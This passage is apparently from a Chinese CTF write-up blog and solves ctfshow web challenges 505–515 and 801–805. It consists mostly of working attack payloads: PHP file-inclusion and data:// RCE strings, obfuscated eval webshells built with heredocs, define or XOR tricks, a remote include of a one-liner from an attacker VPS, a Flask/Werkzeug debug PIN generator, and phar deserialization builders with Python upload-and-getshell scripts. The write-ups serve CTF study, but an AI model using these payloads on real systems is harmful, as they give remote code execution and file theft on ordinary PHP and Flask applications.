<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取文件要求开头是user，就把一句话写在user后面然后包含即可</p>
<h1 id="web506√"><a href="#web506√" class="headerlink" title="web506√"></a>web506√</h1><p>限制了新建模板后缀名，反正直接包含就行。</p>
<h1 id="web507√"><a href="#web507√" class="headerlink" title="web507√"></a>web507√</h1><p>api&#x2F;admin_file_view.php那里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">debug=<span class="number">1</span>&amp;f=data:text/plain,user<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="web508√"><a href="#web508√" class="headerlink" title="web508√"></a>web508√</h1><p>包含图片马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">debug=<span class="number">1</span>&amp;f=/<span class="keyword">var</span>/www/html/img/f3ccdd27d2000e3f9255a7e3e2c48800.jpg</span><br></pre></td></tr></table></figure>


<h1 id="web509√"><a href="#web509√" class="headerlink" title="web509√"></a>web509√</h1><p>上传功能点加了过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|sml|phar|\:|data|file/i&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>])))&#123;</span><br></pre></td></tr></table></figure>

<p>改用短标签就行了，和上一题一样</p>
<h1 id="web510"><a href="#web510" class="headerlink" title="web510"></a>web510</h1><p>上传接口处增强了过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|sml|phar|\:|data|file|&lt;|&gt;|\`|\?|=/i&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>])))&#123;</span><br></pre></td></tr></table></figure>


<p>包含session文件getshell</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330132823-j4pxjss.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330132837-2qfueh5.png" alt="image.png"></p>
<h1 id="web511"><a href="#web511" class="headerlink" title="web511"></a>web511</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nickname=`cat /f*`&amp;avatar=<span class="number">1</span>&amp;username=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然后上传一个新模板为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">var</span>:nickname&#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web512"><a href="#web512" class="headerlink" title="web512"></a>web512</h1><p>这题看了bilibili的官方wp视频，群主嫩牛！</p>
<p>首先是渲染之前新增的过滤</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220331015433-3zcl4pr.png" alt="image.png"></p>
<p>群主提出没过滤很多关键符号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ &#123;&#125; ; . =</span><br></pre></td></tr></table></figure>

<p>通过这几个符号就可以拼接出webshell来，类似这样。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span>  = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">eva</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">l(\$_</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">POS</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">T&#123;1&#125;);</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$c</span>.<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure>

<p>突然想起来之前见过用define拼接的，这里插♂入一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">&quot;EV&quot;</span>, <span class="string">&quot;eva&quot;</span>.<span class="string">&quot;l&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;GETCONT&quot;</span>, <span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;D&quot;</span>,(GETCONT)(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)[353]);//获取$</span><br><span class="line">define(<span class="string">&quot;SHELL&quot;</span>,<span class="string">&quot;&lt;?php &quot;</span>.EV.<span class="string">&quot;(&quot;</span>.D.<span class="string">&quot;_POST[&#x27;a&#x27;]);&quot;</span>);</span><br><span class="line"><span class="built_in">echo</span> (GETCONT)(<span class="string">&#x27;./shell.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">class splf extends SplFileObject &#123;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        parent::fwrite(SHELL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;PHARA&quot;</span>, new splf(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>));</span><br></pre></td></tr></table></figure>


<p>然后通过调用db类来写入webshell，这里用到了<code>clone</code>方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;</span><br><span class="line"><span class="variable">$a</span>  = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">&lt;?php includ</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"><span class="variable">$b</span> = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">e $</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"><span class="variable">$c</span> = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">_POS</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"><span class="variable">$d</span> = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">T&#123;1&#125;?&gt;</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"><span class="variable">$e</span> = &lt;&lt;&lt;<span class="string">a</span></span><br><span class="line"><span class="string">s.php</span></span><br><span class="line"><span class="string">a</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="built_in">clone</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="built_in">log</span>-&gt;<span class="built_in">log</span>=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="built_in">log</span>-&gt;content=<span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$c</span>.<span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>

<p>直接包含data协议</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220331025223-m2so0pa.png" alt="image.png"></p>
<h1 id="web513"><a href="#web513" class="headerlink" title="web513"></a>web513</h1><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220331030141-i4g59yr.png" alt="image.png"></p>
<p>新建一个模板，new.sml，内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">123&#123;&#123;cnzz&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>能够渲染<code>&#123;&#123;cnzz&#125;&#125;</code></p>
<p>新建一个模板，1.sml，里面写上vps里放的一句话的地址，<code>http://xxx.xxx.xxx.xxx/1</code></p>
<p>然后在配置里把cnzz，也就是页面统计，也就是上面的<code>$config[&#39;cnzz&#39;]</code>指向1.sml即可</p>
<h1 id="web514"><a href="#web514" class="headerlink" title="web514"></a>web514</h1><p>还是利用渲染</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public static <span class="keyword">function</span> checkFoot(<span class="variable">$templateContent</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span> ( stripos(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$config</span> = unserialize(file_get_contents(__DIR__.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">			<span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(is_file(<span class="variable">$foot</span>))&#123;</span><br><span class="line">				<span class="variable">$foot</span>=file_get_contents(<span class="variable">$foot</span>);</span><br><span class="line">				<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/&lt;|&gt;|\?|=|php|sess|log|phar|\.|\[|\&#123;|\(|_/&#x27;</span>, <span class="variable">$foot</span>))&#123;</span><br><span class="line">					include(<span class="variable">$foot</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以传入一个没有等于号的data协议来触发rce</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name=12.sml&amp;content[]=data://text/plain;<span class="built_in">base64</span>,PD9waHAgZWNobyBzeXN0ZW0oJ3RhYyAvZionKTsvLzEyMz8+</span><br></pre></td></tr></table></figure>

<h1 id="web515"><a href="#web515" class="headerlink" title="web515"></a>web515</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(msg.<span class="title function_">match</span>(<span class="regexp">/proto|process|require|exec|var|&#x27;|&quot;|:|\[|\]|[0-9]/</span>))!==<span class="literal">null</span> || msg.<span class="property">length</span>&gt;<span class="number">40</span>)</span><br></pre></td></tr></table></figure>

<p>用参数嵌套绕过过滤</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220331122432-2sqgern.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow常用姿势</title>
    <url>/2022/05/16/ctfshow%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="ctfshow-常用姿势"><a href="#ctfshow-常用姿势" class="headerlink" title="[ctfshow]常用姿势"></a>[ctfshow]常用姿势</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>一些近两年来比赛中常用到的姿势</p>
<h1 id="web801-flask算pin"><a href="#web801-flask算pin" class="headerlink" title="web801 flask算pin"></a>web801 flask算pin</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Welcome to ctfshow file download system, use /file?filename= to download file,my debug mode is enable.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/file&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>读相关文件算pin码即可，记录一下可行的脚本</p>
<p>md5</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">username=getpass.getuser() </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, app.__class__.__module__)</span><br><span class="line">mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名 一般为root或者读下/etc/passwd</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),    <span class="comment">#flask库下app.py的绝对路径，可以通过报错信息得到</span></span><br><span class="line">]</span><br><span class="line">mac =<span class="string">&#x27;02:42:ac:0c:ac:28&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">	mac,</span><br><span class="line">	 <span class="string">&quot;机器码&quot;</span></span><br><span class="line">	 ]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">    <span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>sha1:py38适用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> typing <span class="keyword">as</span> t</span><br><span class="line">username=<span class="string">&#x27;root&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">mod=sys.modules.get(modname)</span><br><span class="line">mod = <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>,   <span class="comment">#主程序（app.py）运行的绝对路径</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(probably_public_bits)</span><br><span class="line">mac =<span class="string">&#x27;02:42:ac:0c:ac:28&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">   mac,<span class="comment">#mac地址十进制</span></span><br><span class="line"> <span class="string">&quot;机器码&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="built_in">print</span>(private_bits)</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>需要填的值就一个变化的地方—机器码。旧版的只需要读取&#x2F;proc&#x2F;self&#x2F;cgroup即可，但是新增需要在前面再拼上&#x2F;etc&#x2F;machine-id或者&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id的值</p>
<h1 id="web802-无字母数字webshell"><a href="#web802-无字母数字webshell" class="headerlink" title="web802 无字母数字webshell"></a>web802 无字母数字webshell</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&quot;%13%19%13%14%05%0d&quot;</span>^<span class="string">&quot;%60%60%60%60%60%60&quot;</span>)(<span class="string">&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;</span>^<span class="string">&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>直接构造异或拼接，其他方式有很多很多</p>
<h1 id="web803-phar"><a href="#web803-phar" class="headerlink" title="web803 phar"></a>web803 phar</h1><p>生成phar:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传&amp;getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/1.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;./1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/1.phar/test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;echo system(&#x27;tac f*&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8dff98b5-c424-42b0-80f2-8cd67b9d0866.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=url,data=data1)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure>


<h1 id="web805-反序列化"><a href="#web805-反序列化" class="headerlink" title="web805 反序列化"></a>web805 反序列化</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;echo system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/1.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;./1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/1.phar/test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f41ee967-9ea2-44a4-a865-34628612de63.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=url,data=data1)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure>


<h1 id="web804-绕过open-base-dir"><a href="#web804-绕过open-base-dir" class="headerlink" title="web804 绕过open_base_dir"></a>web804 绕过open_base_dir</h1><p>写入1，然后直接下载即可</p>
